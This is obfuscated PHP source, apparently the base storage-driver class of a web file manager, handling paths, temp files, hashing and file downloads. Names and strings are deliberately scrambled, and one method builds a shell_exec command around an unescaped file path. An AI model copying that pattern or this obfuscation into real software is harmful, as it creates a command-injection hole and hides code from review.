E¦çÒ°ùĞÔ: return $d× ô›¡ªÓ; goto F‡ç…ÆœëÇ; F¹ÕÊÕâÃÂ: $eœŸİëœ = $fàÌÊê‹³· . $D©ñ¥á¡Â¿[66] . $B¾§ª³ö‚³ . $D©ñ¥á¡Â¿[67] . $e†¥ ´²ØÛ; if (isset($b£‚›Šì›³[$eœŸİëœ])) { return $b£‚›Šì›³[$eœŸİëœ]; } if (function_exists($D©ñ¥á¡Â¿[68])) { $d× ô›¡ªÓ = @mb_convert_encoding($e†¥ ´²ØÛ, $B¾§ª³ö‚³, $fàÌÊê‹³·); } else { $d× ô›¡ªÓ = @iconv($fàÌÊê‹³·, $B¾§ª³ö‚³, $e†¥ ´²ØÛ); } goto Eç¿á·Ê“µ; f¡ª®Üó³¥: $b£‚›Šì›³[$B¾§ª³ö‚³ . $D©ñ¥á¡Â¿[66] . $fàÌÊê‹³· . $D©ñ¥á¡Â¿[67] . $e†¥ ´²ØÛ] = $e†¥ ´²ØÛ; $b£‚›Šì›³[$B¾§ª³ö‚³ . $D©ñ¥á¡Â¿[66] . $fàÌÊê‹³· . $D©ñ¥á¡Â¿[67] . $d× ô›¡ªÓ] = $e†¥ ´²ØÛ; $b£‚›Šì›³[$fàÌÊê‹³· . $D©ñ¥á¡Â¿[66] . $B¾§ª³ö‚³ . $D©ñ¥á¡Â¿[67] . $d× ô›¡ªÓ] = $d× ô›¡ªÓ; goto E¦çÒ°ùĞÔ; F‡ç…ÆœëÇ: } public function getPathInner($FáĞ×é¼) { $f’Ìó‘ç© = IO::init($FáĞ×é¼); return $f’Ìó‘ç©->path; } public function getPathOuter($FÁ”““ òá) { $bˆè©ÒÏ”À =& $_SERVER[Õİõş]; $cÉõ‡½Ò…ß = strlen(trim($this->pathBase, $bˆè©ÒÏ”À[8])); $FÁ”““ òá = substr(trim($FÁ”““ òá, $bˆè©ÒÏ”À[8]), $cÉõ‡½Ò…ß); return $this->pathDriver . $bˆè©ÒÏ”À[8] . ltrim($FÁ”““ òá, $bˆè©ÒÏ”À[8]); } public function isParentOf($EÍç÷ö²—, $d·ºï‚àÎ†) { $CÂÔ™¶Ì “ =& $_SERVER[Õİõş]; $EÍç÷ö²— = rtrim(strtolower($EÍç÷ö²—), $CÂÔ™¶Ì “[8]) . $CÂÔ™¶Ì “[8]; $d·ºï‚àÎ† = rtrim(strtolower($d·ºï‚àÎ†), $CÂÔ™¶Ì “[8]) . $CÂÔ™¶Ì “[8]; $AãÂ¦…ÛÆ‹ = strpos($d·ºï‚àÎ†, $EÍç÷ö²—) === 0; return $AãÂ¦…ÛÆ‹; } public function getType() { $fŒé”„ùŞ =& $_SERVER[Õİõş]; $f‚‡ƒåÏÄ£ = str_replace($fŒé”„ùŞ[71], $fŒé”„ùŞ[33], get_class($this)); return strtolower($f‚‡ƒåÏÄ£); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($còã¶ÅßÕÊ, $AãÓˆ‡–˜) { $fÔ„¹‘‘ÜÌ =& $_SERVER[Õİõş]; $Dç¸½Ê‚ß = rtrim($còã¶ÅßÕÊ, $fÔ„¹‘‘ÜÌ[8]) . $fÔ„¹‘‘ÜÌ[8] . $AãÓˆ‡–˜; $cçëğ—·¾÷ = $this->exist($Dç¸½Ê‚ß); return $cçëğ—·¾÷ ? $Dç¸½Ê‚ß : !1; } public function renameObject($dã×¤ÑÔŞé, $a”æ®ŸöÍ) { goto d¿ôÇëƒ‚í; bµ”¼œ³¯É: return $DÆÜİÜ¸Î” ? $a”æ®ŸöÍ : !1; goto A¨ °¶¼òÊ; CŸË“ºïÊ: $dã×¤ÑÔŞé = $this->getPathOuter($dã×¤ÑÔŞé); $a”æ®ŸöÍ = $this->pathFather($dã×¤ÑÔŞé) . $a”æ®ŸöÍ; if (IO::isFile($dã×¤ÑÔŞé)) { $DÆÜİÜ¸Î” = IO::copy($dã×¤ÑÔŞé, $this->pathFather($dã×¤ÑÔŞé), REPEAT_RENAME_FOLDER, $B¾Íµ˜¹Éİ); if ($DÆÜİÜ¸Î”) { IO::remove($dã×¤ÑÔŞé); } } else { $DÆÜİÜ¸Î” = IO::mkdir($a”æ®ŸöÍ); if (!$DÆÜİÜ¸Î”) { return !1; } $Aï¹„…ØõÔ = IO::listPath($dã×¤ÑÔŞé, !0); $aÎƒã¯…„ô = array_merge($Aï¹„…ØõÔ[$C°‹ˆÒ¶âä[73]], $Aï¹„…ØõÔ[$C°‹ˆÒ¶âä[74]]); foreach ($aÎƒã¯…„ô as $eĞ„™Ö§©ƒ) { IO::move($eĞ„™Ö§©ƒ[$C°‹ˆÒ¶âä[75]], $a”æ®ŸöÍ, REPEAT_RENAME_FOLDER); } IO::remove($dã×¤ÑÔŞé); } goto bµ”¼œ³¯É; d¿ôÇëƒ‚í: $C°‹ˆÒ¶âä =& $_SERVER[Õİõş]; $B¾Íµ˜¹Éİ = $a”æ®ŸöÍ; Hook::trigger($C°‹ˆÒ¶âä[72], $this, $dã×¤ÑÔŞé, $this, $this->pathFather($dã×¤ÑÔŞé) . $a”æ®ŸöÍ); goto CŸË“ºïÊ; A¨ °¶¼òÊ: } public function tempFile($aß¦¸ƒƒ›ø = '', $FÜêÆÖç²Ö = '') { goto F²æâƒ¢¿Š; cŠÄàøîİì: return $eï¬µ½âÎğ; goto C‡ãß”ôÏ; CØ£×ğäµŠ: $eï¬µ½âÎğ = $aºİ‰À‚÷å . $aß¦¸ƒƒ›ø; @touch($eï¬µ½âÎğ); if ($FÜêÆÖç²Ö) { file_put_contents($eï¬µ½âÎğ, $FÜêÆÖç²Ö); } goto cŠÄàøîİì; F²æâƒ¢¿Š: if (!$aß¦¸ƒƒ›ø) { $aß¦¸ƒƒ›ø = rand_string(15); } $aºİ‰À‚÷å = TEMP_FILES . rand_string(15) . $_SERVER[Õİõş][8]; @mkdir($aºİ‰À‚÷å, 511, !0); goto CØ£×ğäµŠ; C‡ãß”ôÏ: } public function tempFileRemve($D·¾©ƒ×À) { @unlink($D·¾©ƒ×À); @rmdir($this->pathFather($D·¾©ƒ×À)); } public function mkfile($BÄ›ö‡ŒÄø, $eÈ—“œˆÆ— = '', $f×¶¹˜‹ë = REPEAT_RENAME) { } public function mkdir($aé®ñß»òš, $dÌÑö‹Ö‚­ = REPEAT_SKIP) { } public function copyFile($BÎ¯–„İì, $D­ì÷ˆ–Í) { } public function moveFile($A²ã”ÊÖ¢, $a¥ğ„±À±•) { } public function remove($A¶«öäá­¦) { if ($this->isFile($A¶«öäá­¦)) { return $this->delFile($A¶«öäá­¦); } return $this->delFolder($A¶«öäá­¦); } public function rename($f¥ó†™éÒ›, $eÇ¿•ÚÂÄ›) { } public function exist($dÍ‹‚ŠäÂÔ) { } public function findByHash($d«µ½¹å§¹ = '', $FÎºœ’©‰ = '') { return !1; } public function isFile($B”Ó¢²‘¤ä) { } public function isFolder($AœĞ–•¥°·) { } public function size($Fßóöğ£¦–) { } public function info($c‘’°å›¼Â) { } public function infoSimple($BÙÈÄìÎã) { return $this->info($BÙÈÄìÎã); } public function infoAuth($F öíÃ£) { return $this->info($F öíÃ£); } public function infoFull($BÅóù¦Õõƒ) { return $this->info($BÅóù¦Õõƒ); } public function infoWithChildren($FàŠÖƒÎ) { $Aƒ¯¨¿ÔœÌ =& $_SERVER[Õİõş]; $A™Ùƒ¦åêÎ = $this->info($FàŠÖƒÎ); if ($A™Ùƒ¦åêÎ && $A™Ùƒ¦åêÎ[$Aƒ¯¨¿ÔœÌ[29]] == $Aƒ¯¨¿ÔœÌ[76]) { $eğ§ˆ¦Ü­ = array($Aƒ¯¨¿ÔœÌ[77] => 0, $Aƒ¯¨¿ÔœÌ[78] => 0, $Aƒ¯¨¿ÔœÌ[79] => 0); $this->infoChildren($FàŠÖƒÎ, $eğ§ˆ¦Ü­); $A™Ùƒ¦åêÎ[$Aƒ¯¨¿ÔœÌ[77]] = $eğ§ˆ¦Ü­[$Aƒ¯¨¿ÔœÌ[77]]; $A™Ùƒ¦åêÎ[$Aƒ¯¨¿ÔœÌ[80]] = array($Aƒ¯¨¿ÔœÌ[81] => $eğ§ˆ¦Ü­[$Aƒ¯¨¿ÔœÌ[78]], $Aƒ¯¨¿ÔœÌ[82] => $eğ§ˆ¦Ü­[$Aƒ¯¨¿ÔœÌ[79]]); } return $A™Ùƒ¦åêÎ; } public function listPath($fÅîŞ™Í†—, $a˜Çğ‘êª = false) { } public function has($DÏ©„îÆº, $b–Ü¾«Ñ× = false, $B¹òÄà¡™” = false) { } public function canRead($B˜œ“¸ó©Ã) { } public function canWrite($E£¶µËêòÊ) { } public function getContent($BÀÎ§’©Ë·) { } public function setContent($cÙ‹¼ã³È, $F›™º§¤¹ = '') { } protected function infoChildren($E·ŸòİÈ¡, &$b’¯¨ÛãÕ’) { $d¤±Š ¯¡Ö =& $_SERVER[Õİõş]; check_abort(); $bİ–ºñÙ‚ = $this->listPath($E·ŸòİÈ¡, !0); $bİ–ºñÙ‚ = array_merge($bİ–ºñÙ‚[$d¤±Š ¯¡Ö[74]], $bİ–ºñÙ‚[$d¤±Š ¯¡Ö[73]]); foreach ($bİ–ºñÙ‚ as $D§àñÜ§¡) { if ($D§àñÜ§¡[$d¤±Š ¯¡Ö[29]] == $d¤±Š ¯¡Ö[76]) { $b’¯¨ÛãÕ’[$d¤±Š ¯¡Ö[79]]++; $AˆŞÕ¡°‰Ù = $this->getPathInner($D§àñÜ§¡[$d¤±Š ¯¡Ö[75]]); $this->infoChildren($AˆŞÕ¡°‰Ù, $b’¯¨ÛãÕ’); } else { $b’¯¨ÛãÕ’[$d¤±Š ¯¡Ö[78]]++; $b’¯¨ÛãÕ’[$d¤±Š ¯¡Ö[77]] += $D§àñÜ§¡[$d¤±Š ¯¡Ö[77]]; } } } public function fileSubstr($CÓÏ¨¾Ú°„, $eØöåÆ©“·, $aâ™¡¯âªñ) { } public function listAll($EÖ¢÷îÕçì) { } public function upload($E‡‹±®ÈëØ, $bÙÌ¸ÓÊ­š, $bæ™Æ”„Ö = false, $B©±”î‡ Ü = REPEAT_REPLACE) { } public function uploadFileByID($fĞ¾’ˆŸ–Ç, $C—ÌÔ”³ƒö, $DÃÏ‹›ëŠ£) { } public function uploadFileByPath($F‰·àõƒ‰, $DÖå£ Í†Ü, $eŠ©™Øø­î = array()) { } public function isUploadServer() { $eÜŞÜã‹èÔ =& $_SERVER[Õİõş]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $eÜŞÜã‹èÔ[83]) { return !0; } return $GLOBALS[$eÜŞÜã‹èÔ[6]][$eÜŞÜã‹èÔ[84]][$eÜŞÜã‹èÔ[85]]; } public function isFileOutServer() { $aÆ¹†°Á¶˜ =& $_SERVER[Õİõş]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $aÆ¹†°Á¶˜[83]) { return !0; } return $GLOBALS[$aÆ¹†°Á¶˜[6]][$aÆ¹†°Á¶˜[84]][$aÆ¹†°Á¶˜[86]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($D‚î¶Èå¥–) { $d¶¿îøó§ =& $_SERVER[Õİõş]; if (!$this->isCdnHost()) { return $D‚î¶Èå¥–; } return str_replace(trim(get_url_root($D‚î¶Èå¥–), $d¶¿îøó§[8]), trim($this->cdnHost, $d¶¿îøó§[8]), $D‚î¶Èå¥–); } public function uploadLink($B˜‹‡îÚçŠ, $bëÀÇ§Ô†ô = 0) { goto fÃÃà¹ùÕÒ; DÀ²Ë¶Ÿ„: $E·ÓáÓçß† = $bëÀÇ§Ô†ô <= $A†³Š¤ùÆ ? $A¾®­’¼ˆ[87] : $A¾®­’¼ˆ[88]; $b„éˆâŠ¼ = (!$bëÀÇ§Ô†ô ? 1 : ceil($bëÀÇ§Ô†ô / pow(1024, 3))) * 3600 * 4; $Aó¹´¹®ì = $this->{$E·ÓáÓçß†}($B˜‹‡îÚçŠ, $b„éˆâŠ¼); goto Bù…ÁÙÅ´; Bù…ÁÙÅ´: if ($Aó¹´¹®ì) { $Aó¹´¹®ì[$A¾®­’¼ˆ[89]] = $B˜‹‡îÚçŠ; $Aó¹´¹®ì[$A¾®­’¼ˆ[90]] = $eõˆÓëòõŒ; } return $Aó¹´¹®ì; goto cñŸï»ÚÖÖ; fÃÃà¹ùÕÒ: $A¾®­’¼ˆ =& $_SERVER[Õİõş]; if ($this->isUploadServer()) { return; } $eõˆÓëòõŒ = $this->getType(); goto CÍÆ‹ÄËĞæ; CÍÆ‹ÄËĞæ: if (!in_array($eõˆÓëòõŒ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $A†³Š¤ùÆ = 1024 * 1024 * 10; goto DÀ²Ë¶Ÿ„; cñŸï»ÚÖÖ: } public function uploadFormData($E‡ÆÉîÔğ×, $d‡¹·½˜©à = 3600) { } public function multiUploadFormData($eŠÂƒÓ÷ë¼, $EÇçáƒİğ = 3600) { } public function download($e¹¿›Á×Åì, $c–ÅÇæœİè) { } public function ext($A’ÖÃ·×°Š) { $eˆÄó°áçª =& $_SERVER[Õİõş]; if (strpos($A’ÖÃ·×°Š, $eˆÄó°áçª[8]) === -1) { $e‡šÖó«İö = $A’ÖÃ·×°Š; } else { $e‡šÖó«İö = $this->pathThis($A’ÖÃ·×°Š); } $fµî•ËÑì’ = $eˆÄó°áçª[33]; if (strstr($e‡šÖó«İö, $eˆÄó°áçª[91])) { $fµî•ËÑì’ = substr($e‡šÖó«İö, strrpos($e‡šÖó«İö, $eˆÄó°áçª[91]) + 1); $fµî•ËÑì’ = strtolower($fµî•ËÑì’); } if (strlen($fµî•ËÑì’) > 3 && preg_match($eˆÄó°áçª[92], $fµî•ËÑì’, $f Ã‰ãòóÀ)) { $fµî•ËÑì’ = $eˆÄó°áçª[33]; } return $fµî•ËÑì’; } public function pathThis($E÷óÄŠ°®×) { $e‰¿¸£é©— =& $_SERVER[Õİõş]; $E÷óÄŠ°®× = str_replace($e‰¿¸£é©—[93], $e‰¿¸£é©—[8], rtrim($E÷óÄŠ°®×, $e‰¿¸£é©—[8])); $fÄ‚‰À­©ó = strrpos($E÷óÄŠ°®×, $e‰¿¸£é©—[8]); if ($fÄ‚‰À­©ó === !1) { return $E÷óÄŠ°®×; } return substr($E÷óÄŠ°®×, $fÄ‚‰À­©ó + 1); } public function pathFather($d÷£Ÿ™¶ò‘) { $e®‡·Ü²ô =& $_SERVER[Õİõş]; $d÷£Ÿ™¶ò‘ = str_replace($e®‡·Ü²ô[93], $e®‡·Ü²ô[8], rtrim($d÷£Ÿ™¶ò‘, $e®‡·Ü²ô[8])); $F²¦òšŠãÆ = strrpos($d÷£Ÿ™¶ò‘, $e®‡·Ü²ô[8]); if ($F²¦òšŠãÆ === !1) { return $e®‡·Ü²ô[33]; } return substr($d÷£Ÿ™¶ò‘, 0, $F²¦òšŠãÆ + 1); } public function hashSimple($Bøšİ…¨š) { goto d”§³­ñä£; CÃ¢ŠßÆ‡: $A˜ß¸é¯ø– .= $this->fileSubstr($Bøšİ…¨š, $eùì©Ÿô°Ò - $c»‰ïÆîİ´, $c»‰ïÆîİ´); return md5($A˜ß¸é¯ø–) . $eùì©Ÿô°Ò; goto e•ã´ÍÜÁ¦; cÊ¦¿Ü©ê‹: $A¤ˆ³«“¼™ = intval($eùì©Ÿô°Ò / $cŠ¢Ğ˜èŠŠ); $A˜ß¸é¯ø– = $FÆÑí„¹•[33]; for ($CšÜ‚ˆèñ‚ = 0; $CšÜ‚ˆèñ‚ < $cŠ¢Ğ˜èŠŠ; $CšÜ‚ˆèñ‚++) { $A˜ß¸é¯ø– .= $this->fileSubstr($Bøšİ…¨š, $A¤ˆ³«“¼™ * $CšÜ‚ˆèñ‚, $c»‰ïÆîİ´); } goto CÃ¢ŠßÆ‡; d”§³­ñä£: $FÆÑí„¹• =& $_SERVER[Õİõş]; if (!$Bøšİ…¨š) { return md5($FÆÑí„¹•[33]); } $eùì©Ÿô°Ò = $this->size($Bøšİ…¨š); goto cÔ¥²¶¥øğ; cÔ¥²¶¥øğ: $c»‰ïÆîİ´ = 200; $cŠ¢Ğ˜èŠŠ = 50; if ($eùì©Ÿô°Ò <= $c»‰ïÆîİ´ * $cŠ¢Ğ˜èŠŠ) { return $this->hashMd5($Bøšİ…¨š) . $eùì©Ÿô°Ò; } goto cÊ¦¿Ü©ê‹; e•ã´ÍÜÁ¦: } public static $md5Cache = array(); public function hashMd5($c‡İÜ»Š™˜) { $c‡İÜ»Š™˜ = $this->iconvSystem($c‡İÜ»Š™˜); if (isset(self::$md5Cache[$c‡İÜ»Š™˜])) { return self::$md5Cache[$c‡İÜ»Š™˜]; } self::$md5Cache[$c‡İÜ»Š™˜] = $this->hashMd5Shell($c‡İÜ»Š™˜); if (!self::$md5Cache[$c‡İÜ»Š™˜]) { self::$md5Cache[$c‡İÜ»Š™˜] = @md5_file($c‡İÜ»Š™˜); } return self::$md5Cache[$c‡İÜ»Š™˜]; } private function hashMd5Shell($c¤Ô©•’ƒã) { goto E»É…ç¢á ; cƒóï®‚½: $aéŞ‰³¬çª = shell_exec($bó…µ®Ñ»Ü . "\40\42{$c¤Ô©•’ƒã}\42"); return substr($aéŞ‰³¬çª, 0, 32); goto Bì¯¬¶ÍÙ; f½¨ ôòÃÊ: $bó…µ®Ñ»Ü = Cache::get($C¹ƒßÈ­®¢[97]); if (!$bó…µ®Ñ»Ü) { $B‘ä«®Ì±… = BASIC_PATH . $C¹ƒßÈ­®¢[98]; $c‰¾šø“µ = md5_file($B‘ä«®Ì±…); $bó…µ®Ñ»Ü = $C¹ƒßÈ­®¢[99]; foreach ($c²¼ÂØÜ” as $e«¿ùÉÂê) { $aéŞ‰³¬çª = shell_exec($e«¿ùÉÂê . "\40\42{$B‘ä«®Ì±…}\42"); if ($aéŞ‰³¬çª && substr(trim($aéŞ‰³¬çª), 0, 32) == $c‰¾šø“µ) { $bó…µ®Ñ»Ü = $e«¿ùÉÂê; break; } } Cache::set($C¹ƒßÈ­®¢[97], $bó…µ®Ñ»Ü, 3600); } if ($bó…µ®Ñ»Ü == $C¹ƒßÈ­®¢[99]) { return !1; } goto cƒóï®‚½; E»É…ç¢á : $C¹ƒßÈ­®¢ =& $_SERVER[Õİõş]; if (!function_exists($C¹ƒßÈ­®¢[94])) { return !1; } $c²¼ÂØÜ” = array($C¹ƒßÈ­®¢[95], $C¹ƒßÈ­®¢[96]); goto f½¨ ôòÃÊ; Bì¯¬¶ÍÙ: } public function link($D¯«ÔöÍ½²) { return $D¯«ÔöÍ½²; } public function fileOut($DÅ¼…ç«ƒ, $EŞºÙ£§¤ = false, $cŞ˜ÒÜôê = false, $Fí¿‹†÷Ö± = '') { goto b’Ñª£‹š¢; CàäÛ¨£Œå: $e†ƒ…„Ì§’ = $BŸ¥‰…¥œÌ[$C´‘çˆ’¦Ø[77]]; $bÓÇÁøø»¹ = gmdate($C´‘çˆ’¦Ø[105], $BŸ¥‰…¥œÌ[$C´‘çˆ’¦Ø[106]]); $a›ùîÉªÙÎ = $cŞ˜ÒÜôê ? $cŞ˜ÒÜôê : $this->iconvApp($BŸ¥‰…¥œÌ[$C´‘çˆ’¦Ø[28]]); goto Eƒ³Íí“‰; FÇÉ›Ñ‡Ìõ: $F„Ç©óÄÌÚ = strtolower($_SERVER[$C´‘çˆ’¦Ø[137]]); if ($dŸøÒÁ×ˆ && $F„Ç©óÄÌÚ && $CÃ‚óãÇâŞ) { if (strstr($F„Ç©óÄÌÚ, $C´‘çˆ’¦Ø[138])) { header($C´‘çˆ’¦Ø[139] . $DÅ¼…ç«ƒ); } else { if (strstr($F„Ç©óÄÌÚ, $C´‘çˆ’¦Ø[140])) { header($C´‘çˆ’¦Ø[141] . $DÅ¼…ç«ƒ); } else { if (strstr($F„Ç©óÄÌÚ, $C´‘çˆ’¦Ø[142])) { header($C´‘çˆ’¦Ø[143] . $DÅ¼…ç«ƒ); } } } if ($Eèáêç½ˆ) { header($C´‘çˆ’¦Ø[144] . $Eèáêç½ˆ); } return; } if (isset($_SERVER[$C´‘çˆ’¦Ø[145]])) { if (preg_match($C´‘çˆ’¦Ø[146], $_SERVER[$C´‘çˆ’¦Ø[145]], $Føô†¿¼)) { $F–¢Š¹¡Ü = intval($Føô†¿¼[1]); if (!empty($Føô†¿¼[2])) { $eŠµ¢äîŠœ = intval($Føô†¿¼[2]); } } header($C´‘çˆ’¦Ø[147]); header("\x43\157\156\164\x65\156\164\x2d\122\141\x6e\x67\145\72\40\x62\171\164\x65\x73\x20{$F–¢Š¹¡Ü}\55{$eŠµ¢äîŠœ}\x2f" . $e†ƒ…„Ì§’); } else { header($C´‘çˆ’¦Ø[148]); } goto cˆ¥Ê‹£•; e‰•œœêö‹: $dŸøÒÁ×ˆ = $this->getType() == $C´‘çˆ’¦Ø[101]; $CÃ‚óãÇâŞ = $GLOBALS[$C´‘çˆ’¦Ø[6]][$C´‘çˆ’¦Ø[84]][$C´‘çˆ’¦Ø[102]][$C´‘çˆ’¦Ø[103]]; $Eèáêç½ˆ = (double) $GLOBALS[$C´‘çˆ’¦Ø[6]][$C´‘çˆ’¦Ø[84]][$C´‘çˆ’¦Ø[102]][$C´‘çˆ’¦Ø[104]] * 1024 * 1024; goto c¥ÊÂçÆ›; b’Ñª£‹š¢: $C´‘çˆ’¦Ø =& $_SERVER[Õİõş]; $this->cacheMethod(null, null); if (!$DÅ¼…ç«ƒ || !$this->exist($DÅ¼…ç«ƒ)) { show_json(LNG($C´‘çˆ’¦Ø[100]), !1, $cŞ˜ÒÜôê); } goto e‰•œœêö‹; CÏ²„Åœê: $B«ğƒ¾ÂÑ“ = rawurlencode($a›ùîÉªÙÎ); $B«ğƒ¾ÂÑ“ = $C´‘çˆ’¦Ø[112] . $B«ğƒ¾ÂÑ“ . $C´‘çˆ’¦Ø[116] . $B«ğƒ¾ÂÑ“; if ($EŞºÙ£§¤) { header($C´‘çˆ’¦Ø[117]); header($C´‘çˆ’¦Ø[118] . $B«ğƒ¾ÂÑ“); } else { header($C´‘çˆ’¦Ø[119] . $B«ğƒ¾ÂÑ“); } goto Cï¸³’èé±; Eƒ³Íí“‰: $F–¢Š¹¡Ü = 0; $eŠµ¢äîŠœ = $e†ƒ…„Ì§’ - 1; $e¹ˆŒŠì = $this->ext($a›ùîÉªÙÎ); goto cŒ†Ú¿®ˆõ; c¥ÊÂçÆ›: @ob_end_clean(); set_timeout(); $BŸ¥‰…¥œÌ = $this->infoFull($DÅ¼…ç«ƒ); goto CàäÛ¨£Œå; F Â‰å´ã: header($C´‘çˆ’¦Ø[124]); header($C´‘çˆ’¦Ø[125]); header($C´‘çˆ’¦Ø[126]); goto dÄ´¾³®‘£; cˆ¥Ê‹£•: header($C´‘çˆ’¦Ø[149] . ($eŠµ¢äîŠœ - $F–¢Š¹¡Ü + 1)); if ($_SERVER[$C´‘çˆ’¦Ø[150]] == $C´‘çˆ’¦Ø[151]) { return; } $dˆ¬Æ‡……ä = 1024 * 100; goto EØ„â¸õÅâ; CÓÇ³°öØ: $B¹¬ÊßáĞ = get_file_mime($e¹ˆŒŠì); if (strstr($B¹¬ÊßáĞ, $C´‘çˆ’¦Ø[113])) { $B¹¬ÊßáĞ = $B¹¬ÊßáĞ . $C´‘çˆ’¦Ø[114]; } if ($EŞºÙ£§¤ === !1 && !mime_support($B¹¬ÊßáĞ)) { $EŞºÙ£§¤ = !0; $B¹¬ÊßáĞ = $C´‘çˆ’¦Ø[115]; } goto CÏ²„Åœê; cŒ†Ú¿®ˆõ: if (in_array($e¹ˆŒŠì, array($C´‘çˆ’¦Ø[107], $C´‘çˆ’¦Ø[108], $C´‘çˆ’¦Ø[109], $C´‘çˆ’¦Ø[110]))) { $e¹ˆŒŠì = $C´‘çˆ’¦Ø[111]; } if (!$Fí¿‹†÷Ö±) { $Fí¿‹†÷Ö± = md5($bÓÇÁøø»¹ . $this->hashSimple($DÅ¼…ç«ƒ)); } $Fí¿‹†÷Ö± = $C´‘çˆ’¦Ø[112] . $Fí¿‹†÷Ö± . $C´‘çˆ’¦Ø[112]; goto CÓÇ³°öØ; dÄ´¾³®‘£: if (isset($_SERVER[$C´‘çˆ’¦Ø[127]]) && strtotime($_SERVER[$C´‘çˆ’¦Ø[127]]) == $BŸ¥‰…¥œÌ[$C´‘çˆ’¦Ø[106]]) { header($C´‘çˆ’¦Ø[128], !0, 304); die; } if (isset($_SERVER[$C´‘çˆ’¦Ø[129]]) && $_SERVER[$C´‘çˆ’¦Ø[129]] == $Fí¿‹†÷Ö±) { header($C´‘çˆ’¦Ø[130] . $Fí¿‹†÷Ö±, !0, 304); die; } header($C´‘çˆ’¦Ø[130] . $Fí¿‹†÷Ö±); goto EÖÎ¥½„„; c™‘öØ‡¢«: header($C´‘çˆ’¦Ø[134] . $e†ƒ…„Ì§’); header($C´‘çˆ’¦Ø[135]); if (!$EŞºÙ£§¤ && $e¹ˆŒŠì == $C´‘çˆ’¦Ø[136]) { if ($e†ƒ…„Ì§’ > 1024 * 1024 * 5) { die; } $Dìæ™ç‘•· = $this->getContent($DÅ¼…ç«ƒ); $Dìæ™ç‘•· = Html::clearSVG($Dìæ™ç‘•·); echo $Dìæ™ç‘•·; die; } goto FÇÉ›Ñ‡Ìõ; EÖÎ¥½„„: header($C´‘çˆ’¦Ø[131] . $bÓÇÁøø»¹ . $C´‘çˆ’¦Ø[123]); header($C´‘çˆ’¦Ø[132] . $a›ùîÉªÙÎ); header($C´‘çˆ’¦Ø[133]); goto c™‘öØ‡¢«; Cï¸³’èé±: header($C´‘çˆ’¦Ø[120]); header($C´‘çˆ’¦Ø[121] . $B¹¬ÊßáĞ); header($C´‘çˆ’¦Ø[122] . gmdate($C´‘çˆ’¦Ø[105], time() + 3600 * 24 * 30) . $C´‘çˆ’¦Ø[123]); goto F Â‰å´ã; EØ„â¸õÅâ: $f”Œµ¼Ñ†— = 0; if ($Eèáêç½ˆ) { $f”Œµ¼Ñ†— = intval(1000 * 1000 * ($dˆ¬Æ‡……ä / $Eèáêç½ˆ)); } while ($F–¢Š¹¡Ü <= $eŠµ¢äîŠœ) { $E–Á³´Ú“ë = timeFloat(); check_abort(); $CÃ­ø»Éà = $eŠµ¢äîŠœ - $F–¢Š¹¡Ü + 1; if ($CÃ­ø»Éà <= $dˆ¬Æ‡……ä) { $dˆ¬Æ‡……ä = $CÃ­ø»Éà; } echo $this->fileSubstr($DÅ¼…ç«ƒ, $F–¢Š¹¡Ü, $dˆ¬Æ‡……ä); $F–¢Š¹¡Ü += $dˆ¬Æ‡……ä; if ($dˆ¬Æ‡……ä == $CÃ­ø»Éà) { $F–¢Š¹¡Ü = $eŠµ¢äîŠœ + 1; } if ($f”Œµ¼Ñ†—) { $eïİ½ÚÄ¾÷ = intval(1000 * 1000 * (timeFloat() - $E–Á³´Ú“ë)); $Fª†«¾Çö¤ = $f”Œµ¼Ñ†— - $eïİ½ÚÄ¾÷; if ($Fª†«¾Çö¤ > 5) { usleep($Fª†«¾Çö¤); } } } goto b§ÖÆ‡ŞÀº; b§ÖÆ‡ŞÀº: } public function fileOutServer($e×Ê¡ù÷Ò“, $céË´áßéÚ = false, $båï–ˆöŠù = false, $c›®İè“²­ = '') { $this->fileOut($e×Ê¡ù÷Ò“, $céË´áßéÚ, $båï–ˆöŠù, $c›®İè“²­); } public function fileOutLink($Fƒ¤†Ç´ğá) { header($_SERVER[Õİõş][152] . $Fƒ¤†Ç´ğá); die; } public function cacheMethod($A½ğ¤Å¸¹î, $F¯Ò‘Ç™) { goto b±¦õƒ¦å; B¯—Ô‚×Û: if (is_null($A½ğ¤Å¸¹î)) { $C§‡°à´ = array(); return; } if (is_null($F¯Ò‘Ç™)) { unset($C§‡°à´[$fƒœ¼¹´²ù]); return; } $F˜Ò¾š‚ƒ = isset($C§‡°à´[$fƒœ¼¹´²ù]) ? $C§‡°à´[$fƒœ¼¹´²ù] : null; goto F˜‘š¡Ôæß; FäŒ¡ä¹í: return $F˜Ò¾š‚ƒ; goto A¼ƒ‹¯È¸˜; F˜‘š¡Ôæß: if (!is_null($F˜Ò¾š‚ƒ)) { return $F˜Ò¾š‚ƒ; } $F˜Ò¾š‚ƒ = $this->{$A½ğ¤Å¸¹î}($F¯Ò‘Ç™); $C§‡°à´[$fƒœ¼¹´²ù] = $F˜Ò¾š‚ƒ; goto FäŒ¡ä¹í; b±¦õƒ¦å: $aÏ‰í›‚‹‘ =& $_SERVER[Õİõş]; static $C§‡°à´ = array(); $fƒœ¼¹´²ù = $aÏ‰í›‚‹‘[153] . $A½ğ¤Å¸¹î . $aÏ‰í›‚‹‘[154] . rtrim($F¯Ò‘Ç™, $aÏ‰í›‚‹‘[8]); goto B¯—Ô‚×Û; A¼ƒ‹¯È¸˜: } public function fileOutImage($E†â¤¨†‰Ü, $dÀêñ—ÓôÈ = 250) { goto D‰×º©õÑ—; C½Î¢øÉ‚Ä: $e„«Ó½ƒ = DATA_THUMB . $c¢Ï‹œó„˜; if (!@file_exists($e„«Ó½ƒ)) { $dº‰ÆÁ¶©Š = TEMP_FILES; if (!is_dir($dº‰ÆÁ¶©Š)) { mk_dir($dº‰ÆÁ¶©Š); } $Dêô‰‡ó¬° = $dº‰ÆÁ¶©Š . $cíá…ÑİÒğ . $f§‘ä©Êß[91] . $b•ÕÆÃÎŸá[$f§‘ä©Êß[156]]; if (!@file_exists($Dêô‰‡ó¬°)) { $Dêô‰‡ó¬° = $this->download($E†â¤¨†‰Ü, $Dêô‰‡ó¬°); } $aÂñä™ÁÃÒ = new ImageThumb($Dêô‰‡ó¬°, $f§‘ä©Êß[163]); $aÂñä™ÁÃÒ->prorate($e„«Ó½ƒ, 